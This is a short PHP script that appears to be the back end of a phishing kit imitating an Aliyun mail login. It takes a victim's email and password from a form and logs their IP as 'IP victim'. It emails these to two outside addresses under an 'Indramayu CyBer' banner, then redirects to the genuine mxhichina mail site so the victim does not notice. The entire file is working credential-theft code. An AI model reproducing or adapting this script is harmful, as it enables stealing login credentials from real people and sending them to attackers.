<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['a'];
$password = $_POST['p'];


$login = "Email : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "ALIYUN LOGIN | ".$email;
mail("oluwa.dlog@yandex.com, blessedlogs1@gmail.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: https://mail.mxhichina.com/");
?>